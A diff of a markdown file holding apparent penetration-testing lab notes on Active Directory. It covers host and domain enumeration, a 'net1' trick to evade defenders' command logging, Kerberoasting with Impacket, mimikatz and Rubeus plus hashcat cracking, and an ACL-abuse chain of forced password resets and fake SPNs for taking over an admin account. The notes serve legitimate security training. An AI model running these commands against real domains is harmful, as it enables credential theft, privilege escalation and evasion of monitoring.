+* `powershell.exe -version 2` → running version 2 of powershell.
 
-<aside>
-1️⃣ **Checking Defenses**
+1️⃣ \*\*Checking Defenses\*\*
 
-</aside>
+* `PS C:\htb> netsh advfirewall show allprofiles` → Firewall checks
+* `C:\htb> sc query windefend` → windows defender from cmd
+* `PS C:\htb> Get-MpComputerStatus` → check the status and configuration settings
 
-- `PS C:\htb> netsh advfirewall show allprofiles` → Firewall checks
-- `C:\htb> sc query windefend` → windows defender from cmd
-- `PS C:\htb> Get-MpComputerStatus` → check the status and configuration settings
+2️⃣ \*\*Am I Alone?\*\*
 
-<aside>
-2️⃣ **Am I Alone?**
+* `PS C:\htb> qwinsta` → display info about remote desktop services.
 
-</aside>
+| Networking Commands          | Description                                                                                                      |
+| ---------------------------- | ---------------------------------------------------------------------------------------------------------------- |
+| arp -a                       | Lists all known hosts stored in the arp table.                                                                   |
+| ipconfig /all                | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
+| route print                  | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
+| netsh advfirewall show state | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |
 
-- `PS C:\htb> qwinsta` → display info about remote desktop services.
+3️⃣ \*\*Windows Management Instrumentation (WMI)\*\*
 
-| Networking Commands | Description |
-| --- | --- |
-| arp -a | Lists all known hosts stored in the arp table. |
-| ipconfig /all | Prints out adapter settings for the host. We can figure out the network segment from here. |
-| route print | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
-| netsh advfirewall show state | Displays the status of the host's firewall. We can determine if it is active and filtering traffic. |
+[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.
 
-<aside>
-3️⃣ **Windows Management Instrumentation (WMI)**
+#### **Quick WMI checks**
 
-</aside>
+| Command                                                                            | Description                                                                                            |
+| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
+| wmic qfe get Caption,Description,HotFixID,InstalledOn                              | Prints the patch level and description of the Hotfixes applied                                         |
+| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List | Displays basic host information to include any attributes within the list                              |
+| wmic process list /format:list                                                     | A listing of all processes on host                                                                     |
+| wmic ntdomain list /format:list                                                    | Displays information about the Domain and Domain Controllers                                           |
+| wmic useraccount list /format:list                                                 | Displays information about all local accounts and any domain accounts that have logged into the device |
+| wmic group list /format:list                                                       | Information about all local groups                                                                     |
+| wmic sysaccount list /format:list                                                  | Dumps information about any system accounts that are being used as service accounts.                   |
 
-[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.
+4️⃣ \*\*Net Commands\*\*
 
-### **Quick WMI checks**
+[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:
 
-| Command | Description |
-| --- | --- |
-| wmic qfe get Caption,Description,HotFixID,InstalledOn | Prints the patch level and description of the Hotfixes applied |
-| wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List | Displays basic host information to include any attributes within the list |
-| wmic process list /format:list | A listing of all processes on host |
-| wmic ntdomain list /format:list | Displays information about the Domain and Domain Controllers |
-| wmic useraccount list /format:list | Displays information about all local accounts and any domain accounts that have logged into the device |
-| wmic group list /format:list | Information about all local groups |
-| wmic sysaccount list /format:list | Dumps information about any system accounts that are being used as service accounts. |
+* Local and domain users
+* Groups
+* Hosts
+* Specific users in groups
+* Domain Controllers
+* Password requirements
 
-<aside>
-4️⃣ **Net Commands**
+#### **Table of Useful Net Commands**
 
-</aside>
+| Command                                        | Description                                                                                                                |
+| ---------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
+| net accounts                                   | Information about password requirements                                                                                    |
+| net accounts /domain                           | Password and lockout policy                                                                                                |
+| net group /domain                              | Information about domain groups                                                                                            |
+| net group "Domain Admins" /domain              | List users with domain admin privileges                                                                                    |
+| net group "domain computers" /domain           | List of PCs connected to the domain                                                                                        |
+| net group "Domain Controllers" /domain         | List PC accounts of domains controllers                                                                                    |
+| net group \<domain\_group\_name> /domain       | User that belongs to the group                                                                                             |
+| net groups /domain                             | List of domain groups                                                                                                      |
+| net localgroup                                 | All available groups                                                                                                       |
+| net localgroup administrators /domain          | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
+| net localgroup Administrators                  | Information about a group (admins)                                                                                         |
+| net localgroup administrators \[username] /add | Add user to administrators                                                                                                 |
+| net share                                      | Check current shares                                                                                                       |
+| net user \<ACCOUNT\_NAME> /domain              | Get information about a user within the domain                                                                             |
+| net user /domain                               | List all users of the domain                                                                                               |
+| net user %username%                            | Information about the current user                                                                                         |
+| net use x: \computer\share                     | Mount the share locally                                                                                                    |
+| net view                                       | Get a list of computers                                                                                                    |
+| net view /all /domain\[:domainname]            | Shares on the domains                                                                                                      |
+| net view \computer /ALL                        | List shares of a computer                                                                                                  |
+| net view /domain                               | List of PCs of the domain                                                                                                  |
 
-[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:
+#### **Net Commands Trick**
 
-- Local and domain users
-- Groups
-- Hosts
-- Specific users in groups
-- Domain Controllers
-- Password requirements
+If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.
 
-### **Table of Useful Net Commands**
+5️⃣ \*\*Dsquery\*\*
 
-| Command | Description |
-| --- | --- |
-| net accounts | Information about password requirements |
-| net accounts /domain | Password and lockout policy |
-| net group /domain | Information about domain groups |
-| net group "Domain Admins" /domain | List users with domain admin privileges |
-| net group "domain computers" /domain | List of PCs connected to the domain |
-| net group "Domain Controllers" /domain | List PC accounts of domains controllers |
-| net group <domain_group_name> /domain | User that belongs to the group |
-| net groups /domain | List of domain groups |
-| net localgroup | All available groups |
-| net localgroup administrators /domain | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
-| net localgroup Administrators | Information about a group (admins) |
-| net localgroup administrators [username] /add | Add user to administrators |
-| net share | Check current shares |
-| net user <ACCOUNT_NAME> /domain | Get information about a user within the domain |
-| net user /domain | List all users of the domain |
-| net user %username% | Information about the current user |
-| net use x: \computer\share | Mount the share locally |
-| net view | Get a list of computers |
-| net view /all /domain[:domainname] | Shares on the domains |
-| net view \computer /ALL | List shares of a computer |
-| net view /domain | List of PCs of the domain |
-
-### **Net Commands Trick**
-
-If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.
-
-<aside>
-5️⃣ **Dsquery**
-
-</aside>
-
-[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section.
+[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952\(v=ws.11\)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section.
 
 We need to have elevated privileges on host or ability to run an instance of Cmd prompt or PowerShell from a SYSTEM context.
 
-- `dsquery user` → list users
-- `dsquery computer` → computer search
-- `dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"` → wildcard search to view all objects in an OU
-- `PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName` → search for all domain controllers in current domain limiting to five result.
-strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. are LDAP queries that can be used with several different tools too, including AD powershell, ldapsearch etc
+* `dsquery user` → list users
+* `dsquery computer` → computer search
+* `dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"` → wildcard search to view all objects in an OU
+* `PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName` → search for all domain controllers in current domain limiting to five result. strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. are LDAP queries that can be used with several different tools too, including AD powershell, ldapsearch etc
 
 `userAccountControl:1.2.840.113556.1.4.803:` → specifies that we are lookin at the UAC attributes for an object
-    
-    `=8192` ⇒ represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like 
-    
-               `password is   not required` or `account is locked` is set.
-    
-     
-    
-    ### **UAC Values**
-    
-    ![Untitled](ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%202.png)
-    
-    QUESTION
-    
-    Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.
-    
-    - `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(|(memberOf=CN=Administrators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL)(memberOf=CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL)(memberOf=CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL)))" -attr sAMAccountName -limit 0`
-        
-        
-        Gives the list of users having administrative privileges and disabled account
-        
-    - `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(sAMAccountName=username))" -attr description`
-        
-        
-        This will show the content of description of the given user.
-        
 
-# Cooking With Fire (kerberoasting)
+```
+`=8192` ⇒ represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like 
 
-# Kerberoasting - From Linux
+           `password is   not required` or `account is locked` is set.
+
+ 
+
+### **UAC Values**
+
+![Untitled](ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%202.png)
+
+QUESTION
+
+Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.
+
+- `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(|(memberOf=CN=Administrators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL)(memberOf=CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL)(memberOf=CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL)))" -attr sAMAccountName -limit 0`
+    
+    
+    Gives the list of users having administrative privileges and disabled account
+    
+- `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(sAMAccountName=username))" -attr description`
+    
+    
+    This will show the content of description of the given user.
+    
+```
+
+## Cooking With Fire (kerberoasting)
+
+## Kerberoasting - From Linux
 
 This attack targets `Service Principal Names (SPN)` accounts.
 
 SPN are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.
 
-Any domain user can request a Kerberos ticket for any service account in the same domain. 
+Any domain user can request a Kerberos ticket for any service account in the same domain.
 
 **Depending on your position in a network, this attack can be performed in multiple ways:**
 
-- From a non-domain joined Linux host using valid domain user credentials.
-- From a domain-joined Linux host as root after retrieving the keytab file.
-- From a domain-joined Windows host authenticated as a domain user.
-- From a domain-joined Windows host with a shell in the context of a domain account.
-- As SYSTEM on a domain-joined Windows host.
-- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.
-
-- `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend` → list spn accounts
-- `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request` → Requesting all TGS tickets
-- `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev` → Requesting a single TGS ticket.
+* From a non-domain joined Linux host using valid domain user credentials.
+* From a domain-joined Linux host as root after retrieving the keytab file.
+* From a domain-joined Windows host authenticated as a domain user.
+* From a domain-joined Windows host with a shell in the context of a domain account.
+* As SYSTEM on a domain-joined Windows host.
+* From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.
+* `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend` → list spn accounts
+* `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request` → Requesting all TGS tickets
+* `Impacket-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev` → Requesting a single TGS ticket.
 
 we can use `-outputfil filename` flag to save the TGS ticket in a file.
 
-- `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt`  → cracking Ticket offline using Hashcat
+* `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt` → cracking Ticket offline using Hashcat
+* `sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!` → testing authentication against a domain controller
 
-- `sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!` → testing authentication against a domain controller
+## Kerberoasting - From Windows
 
-# Kerberoasting - From Windows
-
-<aside>
 👽 Semi Manual Method
 
-</aside>
-
-- `C:\htb> setspn.exe -Q */*` → lists various available SPNs
-
-- `PS C:\htb> Add-Type -AssemblyName System.IdentityModel`
-- `PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
-    - The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
-    - The `AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
-    - [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
-    - We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
-    - We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
+* `C:\htb> setspn.exe -Q */*` → lists various available SPNs
+* `PS C:\htb> Add-Type -AssemblyName System.IdentityModel`
+* `PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
+  * The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
+  * The `AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
+  * [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
+  * We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
+  * We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
 
 We are requesting TGS tickets for an account mssqlsvc and load them into memory to later extract using Mimikatz
 
-- `PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` → request tickets for all accounts with SPNs set.
+* `PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }` → request tickets for all accounts with SPNs set.
 
 Now lets extract tickets from mimikatz
 
@@ -846,68 +753,62 @@ ZWZyZWlnaHQubG9jYWw6MTQzMw==
 <SNIP>
 ```
 
-if we do not specify  `base64 /out:true` , mimikatz will extract the tickets and write them to `.kirbi` files
+if we do not specify  `base64 /out:true` , mimikatz will extract the tickets and write them to `.kirbi` files
 
-- decode this base64 Blob and save into file`sqldev.kirbi`
-- then use `kirbi2john` to extract Kerberos Ticket.
-- `dollarboysushil@htb[/htb]**$** sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` → modify the file/hash for Hashcat
-    
-    **$**krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b38e71a057feeab → it will look something like this
-    
-- `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`  → finally cracking the hash.
+* decode this base64 Blob and save into file`sqldev.kirbi`
+* then use `kirbi2john` to extract Kerberos Ticket.
+*   `dollarboysushil@htb[/htb]**$** sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat` → modify the file/hash for Hashcat
 
-<aside>
-🤖 **Automated / Tool Based Route**
+    \*\*$\*\*krb5tgs$23$_sqldev.kirbi_$813149fb261549a6a1b38e71a057feeab → it will look something like this
+* `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt` → finally cracking the hash.
 
-</aside>
+🤖 \*\*Automated / Tool Based Route\*\*
 
-- `setspn.exe -Q */*` → list available spns
+* `setspn.exe -Q */*` → list available spns
 
-# **Using PowerView**
+## **Using PowerView**
 
-- `PS C:\htb> Import-Module .\PowerView.ps1` → importing powerview
-- `PS C:\htb> Get-DomainUser * -spn | select samaccountname` → getting spn account
-- `PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat` → Targeting Specific User
+* `PS C:\htb> Import-Module .\PowerView.ps1` → importing powerview
+* `PS C:\htb> Get-DomainUser * -spn | select samaccountname` → getting spn account
+* `PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat` → Targeting Specific User
+* `PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` → Exporting All tickets to csv file
 
-- `PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation` → Exporting All tickets to csv file
-
-# **Using Rubeus**
+## **Using Rubeus**
 
 Rubeus doesnot need us to explicitly set the SPN or the user.
 
-- `PS C:\htb> .\Rubeus.exe kerberoast /stats` → get the stats
-- `PS C:\htb> .\Rubeus.exe kerberoast`
-    
-    we can add flag `/nowrap` so that hash will not be wrapped in any form so it will be easier to crack using hashcat.
-    
-    also we can use `/outfile:filename` to save the ticket, instead of displaying it. 
-    
-- `PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap` → for specific user.
+* `PS C:\htb> .\Rubeus.exe kerberoast /stats` → get the stats
+*   `PS C:\htb> .\Rubeus.exe kerberoast`
 
-we can use `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.
+    we can add flag `/nowrap` so that hash will not be wrapped in any form so it will be easier to crack using hashcat.
+
+    also we can use `/outfile:filename` to save the ticket, instead of displaying it.
+* `PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap` → for specific user.
+
+we can use `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.
 
 RC4 is easier to crack compared to AES 256 and128
 
-# An ACE in the Hole
+## An ACE in the Hole
 
 Access Control List (ACL) Abuse Primer
 
 ACL are list that defines
 
-- Who has access to which asset/resources
-- the level of access they are provisioned.
+* Who has access to which asset/resources
+* the level of access they are provisioned.
 
-The settings themselves in an ACL are called `Access Control Entries` (`ACEs`)
+The settings themselves in an ACL are called `Access Control Entries` (`ACEs`)
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%203.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 3.png>)
 
-# **ACL Enumeration**
+## **ACL Enumeration**
 
-# **Using PowerView**
+## **Using PowerView**
 
-- `PS C:\htb> Import-Module .\PowerView.ps1`
-- `PS C:\htb> $sid = Convert-NameToSid wley` → Getting SID of the target user.
-- `PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
+* `PS C:\htb> Import-Module .\PowerView.ps1`
+* `PS C:\htb> $sid = Convert-NameToSid wley` → Getting SID of the target user.
+* `PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}`
 
 ```powershell
 PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} AceQualifier           : AccessAllowed
@@ -934,8 +835,8 @@ This shows, user wley has User-Force-Change-Password over user damundsen
 
 Further enumerating rights of damundsen
 
-- `PS C:\htb> $sid2 = Convert-NameToSid damundsen`
-- `PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose`
+* `PS C:\htb> $sid2 = Convert-NameToSid damundsen`
+* `PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose`
 
 ```powershell
 PS C:\htb> $sid2 = Convert-NameToSid damundsenPS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -VerboseAceType               : AccessAllowed
@@ -955,88 +856,85 @@ AceFlags              : ContainerInherit
 AceQualifier          : AccessAllowed
 ```
 
-This shows user damundsen  has GenericWrite privileges over the Help Desk Level 1 Group.
+This shows user damundsen has GenericWrite privileges over the Help Desk Level 1 Group.
 
-# **Enumerating ACLs with BloodHound**
+## **Enumerating ACLs with BloodHound**
 
 Import the file from ingestor
 
 in search box, search for the user we have control `wley` in this case.
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%204.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 4.png>)
 
 In Node info tab, we can use the `Outbound Object Control section`
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%205.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 5.png>)
 
 we can see `wley` has `force change password` over the user `damundsen` user
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%206.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 6.png>)
 
 we can then right click on the line, which gives us help option
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%207.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 7.png>)
 
 which shows help around abusing this ACE
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%208.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 8.png>)
 
 we can get whole attack path from `Transitive Object Control` Section
 
-# **ACL Abuse Tactics**
+## **ACL Abuse Tactics**
 
 From previous Section, we will continue to do attack
 
-![Untitled](.gitbook/assets/ACTIVE%20DIRECTORY%20Enum%20&%20Attacks%204af4b148af5740d1a6a92a3c741df505/Untitled%209.png)
+![Untitled](<.gitbook/assets/ACTIVE DIRECTORY Enum & Attacks 4af4b148af5740d1a6a92a3c741df505/Untitled 9.png>)
 
-- First we will use user `wley` to change password of `damundsen`
-- then using `damundsen` we will use `Generic Write` right to add user we control to `Help Desk Level 1` group
-- User of `Help Desk Level 1` group is member of `Info Tech` group and member of `Info Tech` group have generic all right over user `adunn`
-- Thus we will take control of user `Adunn`
-
-- `PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force` → creating $secpassword variable which stores passoword of wley
-- `PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)` → creating $cred variable which stores PSCredential object which contains securely stored user credentials. Because later -Credential parameter expects a PSCredential object not a plain text string.
-
-- `PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` → creating variable to store password for damundsen user
+* First we will use user `wley` to change password of `damundsen`
+* then using `damundsen` we will use `Generic Write` right to add user we control to `Help Desk Level 1` group
+* User of `Help Desk Level 1` group is member of `Info Tech` group and member of `Info Tech` group have generic all right over user `adunn`
+* Thus we will take control of user `Adunn`
+* `PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force` → creating $secpassword variable which stores passoword of wley
+* `PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)` → creating $cred variable which stores PSCredential object which contains securely stored user credentials. Because later -Credential parameter expects a PSCredential object not a plain text string.
+* `PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force` → creating variable to store password for damundsen user
 
 import powerview and then
 
-- `PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` → changing password of user damundsen
-
-- `PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $damundsenPassword)` → creating PSCredential object which contains creds of user damundsen
+* `PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose` → changing password of user damundsen
+* `PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $damundsenPassword)` → creating PSCredential object which contains creds of user damundsen
 
 Before adding user damundsen to `Help Desk Level 1` Group, lets confirm our user is not a member of the target group
 
-- `PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members`
+* `PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members`
 
 Now lets add to `Help Desk Level 1` group
 
-- `PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
-- `PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName` → confirming damundsen was added to the group
+* `PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`
+* `PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName` → confirming damundsen was added to the group
 
-If for some reason we donot have permission to interrupt the admin account `adunn` 
+If for some reason we donot have permission to interrupt the admin account `adunn`
 
 we can create a fake SPN, then kerberoast to obtain TGS ticket and hopefully crack the hash offline .
 
-- `PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` → creating a fake SPN
-- `PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap`
+* `PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose` → creating a fake SPN
+* `PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap`
 
 Kerberoasting with Rubeus
 
-| Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose | PowerView tool used to remove the fake Service Principal Name created during the attack from a Windows-based host. |
-| --- | --- |
+| Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose                | PowerView tool used to remove the fake Service Principal Name created during the attack from a Windows-based host.                       |
+| ------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
